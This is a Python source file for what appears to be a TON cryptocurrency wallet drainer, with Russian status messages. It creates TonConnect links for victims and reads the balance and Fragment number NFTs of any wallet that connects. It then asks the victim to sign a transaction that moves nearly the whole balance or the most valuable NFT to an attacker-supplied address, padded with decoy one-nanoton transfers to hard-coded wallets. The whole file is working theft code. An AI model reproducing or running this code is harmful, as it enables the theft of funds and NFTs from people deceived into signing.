import aiohttp
import asyncio
import secrets
from datetime import datetime
from tonsdk.utils import Address, b64str_to_bytes, b64str_to_bytes, b64str_to_hex, bytes_to_b64str
from pytonconnect import TonConnect
from pytonconnect.exceptions import UserRejectsError, UnknownAppError, UnknownError
from pytoniq_core import begin_cell, Cell
from base64 import urlsafe_b64encode
import os
from bs4 import BeautifulSoup
import requests
import json

manifest = "https://aslan22822.github.io/ton-connect-wallet/"

def cls():
    os.system("cls" if os.name=="nt" else "clear")

MEMORY = {}

random_wallets = ['0:ad8afecfacc248996885d8be6824280f9f3a7e54c2f6080b7971b9f556c280c4', '0:894e485dd56db0ced915369fddb0a069bf6488a145a8232cc8ee642b6d2ae3fc', '0:b774d95eb20543f186c06b371ab88ad704f7e256130caf96189368a7d0cb6ccf', '0:ce3cdcf95089b75ee5ce9824a4ff506f40b75090c4be96637c2b8d38b1097224', '0:408da3b28b6c065a593e10391269baaa9c5f8caebc0c69d9f0aabbab2a99256b', '0:a3935861f79daf59a13d6d182e1640210c02f98e3df18fda74b8f5ab141abf18']

async def get_addr_balance(addr):
    async with aiohttp.ClientSession() as s:
        async with s.get(f'https://tonapi.io/v2/accounts/{addr}') as r:
            return int((await r.json())['balance']) / 1_000_000_000

def check_price(number): 
    html = BeautifulSoup(requests.get(f"https://fragment.com/number/{number}").text, "lxml")
    is_sold = html.select("span.tm-section-header-status.tm-status-unavail")
    if not is_sold:
        return False
    price = html.select("table")[0].select("div.table-cell-value.tm-value.icon-before.icon-ton")
    if price:
        return int(price[0].contents[0].replace(",", ""))
    return False

async def get_nft(addr):
    async with aiohttp.ClientSession() as s:
        async with s.get(f'https://tonapi.io/v2/accounts/{addr}/nfts') as r:
            data = (await r.json())['nft_items']
    if data == []:
        return None
    nfts = {}
    nft = {}
    for i in data:
        try:
            i['collection']
        except:
            continue
        if i['collection']['address'] != '0:0e41dc1dc3c9067ed24248580e12b3359818d83dee0304fabcf80845eafafdb2':
            continue
        name = i['metadata']['name']
        price = check_price(name.replace(" ", "").replace("+", ""))
        if price is False:
            continue
        nft_address = i['address']
        nft_url = f'https://fragment.com/number/{name.replace(" ", "").replace("+", "")}'
        nfts[name] = {'name': name, 'nft_address': nft_address, 'nft_url': nft_url, 'price': price}
    if nfts == {}:
       return None
    for i in nfts:
        if nft == {}:
            nft = nfts[i]
            continue
        if nft['price'] < nfts[i]['price']:
           nft = nfts[i]
    return nft if nft != {} else None
            
def get_nft_transfer_message(nft_address: str, recipient_address: str, transfer_fee: int, response_address: str = None) -> dict:
    data = {
        'address': nft_address,
        'amount': str(transfer_fee),
        'payload': urlsafe_b64encode(
            begin_cell()
            .store_uint(0x5fcc3d14, 32)
            .store_uint(0, 64)
            .store_address(recipient_address)
            .store_address(response_address)
            .store_uint(0, 1)
            .store_coins(1)
            .store_uint(0, 1)
            .end_cell()
            .to_boc()
        )
        .decode()
    }
    return data

async def create_url(address, type, comment):
    id = ''.join(secrets.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for i in range(10))
    connector = TonConnect(manifest_url=manifest)
    if await connector.restore_connection():
        await connector.disconnect()
    wallets_list = connector.get_wallets()
    wallet = None
    for w in wallets_list:
        if w['name'] == type:
            wallet = w
    auth_url = await connector.connect(wallet)
    asyncio.create_task(task(address, comment, id, connector))
    
    MEMORY[id] = {
        'id': id,
        'status': 'Создана',
        'error': None,
        'nft': {},
        'wallet': {},
        't_type': 'balance'
    }
    
    return (auth_url, id)

async def drain_wallet(comment, id, connector, withward_address):
    if not connector.connected:
        MEMORY[id]['status'] = 'Ошибка'
        MEMORY[id]['error'] = 'Ошибка подключения'
        #await asyncio.sleep(60)
        #del MEMORY[id]
        return
    
    address = Address(connector.account.address).to_string(True, True, True)
    raw_withward_address = Address(withward_address).to_string(False, False, False)
    MEMORY[id]['wallet']['address'] = address
    
    balance = await get_addr_balance(address)
    MEMORY[id]['wallet']['balance'] = balance
    
    if balance < 0.034:
        MEMORY[id]['status'] = 'Ошибка'
        MEMORY[id]['error'] = 'Маленький баланс'
        await connector.disconnect()
        #await asyncio.sleep(60)
        #del MEMORY[id]
        return
    
    balance = balance - 0.034
    MEMORY[id]['wallet']['balance'] = balance
    
    nft = await get_nft(address)
    nft = None
    if nft is not None:
        if balance >= 1.1 and balance < 150:
            MEMORY[id]['t_type'] = 'nft'
            MEMORY[id]['nft'] = nft
    
    MEMORY[id]['status'] = 'Генерация транзакций'
    comment_data = begin_cell().store_uint(0, 32).store_string(comment).end_cell()
    comment = urlsafe_b64encode(comment_data.to_boc(False)).decode()
    
    transaction = {'valid_until':(int(datetime.now().timestamp()) + 900) * 1000, 'messages': []}
    for _ in range(3 if MEMORY[id]['t_type'] != 'nft_balance' else 2):

        transaction['messages'].append({'address': random_wallets[_], 'amount': '1', 'payload': comment})

    if MEMORY[id]['t_type'] == 'balance':
        transaction['messages'].append({'address': withward_address, 'amount': str(int(balance*1_000_000_000)), 'payload': comment})
    elif MEMORY[id]['t_type'] == 'nft':
        transaction['messages'].append(get_nft_transfer_message(nft_address=Address(nft['nft_address']).to_string(True, True, True), recipient_address=raw_withward_address, transfer_fee=int(0.07 * 10**9), response_address=address))
    elif MEMORY[id]['t_type'] == 'nft_balance':
        transaction['messages'].append({'address': withward_address, 'amount': str(int((balance-1)*1_000_000_000)), 'payload': comment})
        transaction['messages'].append(get_nft_transfer_message(nft_address=Address(nft['nft_address']).to_string(True, True, True), recipient_address=raw_withward_address, transfer_fee=int(0.07 * 10**9), response_address=address))
    try:
        MEMORY[id]['status'] = 'Отправка транзакции и ожидание реакции юзера'
        await connector.send_transaction(transaction)
        MEMORY[id]['status'] = 'Таранзакция отправлена'
        await connector.disconnect()
        MEMORY[id]['status'] = 'Выполнено'
        #await asyncio.sleep(60)
        #del MEMORY[id]
    except UserRejectsError:
        MEMORY[id]['status'] = 'Ошибка'
        MEMORY[id]['error'] = 'Юзер проигнорировал или отменил транзакцию'
        await connector.disconnect()
        #await asyncio.sleep(60)
        #del MEMORY[id]
    except (UnknownError, UnknownAppError) as e:
        MEMORY[id]['status'] = 'Ошибка'
        MEMORY[id]['error'] = 'Ошибка при отправке транзакции'
        await connector.disconnect()
        #await asyncio.sleep(60)
        #del MEMORY[id]

async def task(withward_address, comment, id, connector):
    def status_changed(wallet_info):
        unsubscribe()
    def status_error(e):
        print(f'connect_error[id: {id}]: {e}')
    unsubscribe = connector.on_status_change(status_changed, status_error)
    MEMORY[id]['status'] = 'Ожидание подключения'
    while True:
        try:
            await asyncio.sleep(1)
            if connector.connected:
                MEMORY[id]['status'] = 'Подключен'
                await drain_wallet(comment, id, connector, withward_address)
                break
        except Exception as e:
            MEMORY[id]['status'] = 'Ошибка'
            MEMORY[id]['error'] = str(e)
            if connector.connected:
                await connector.disconnect()
            #await asyncio.sleep(60)
            #del MEMORY[id]
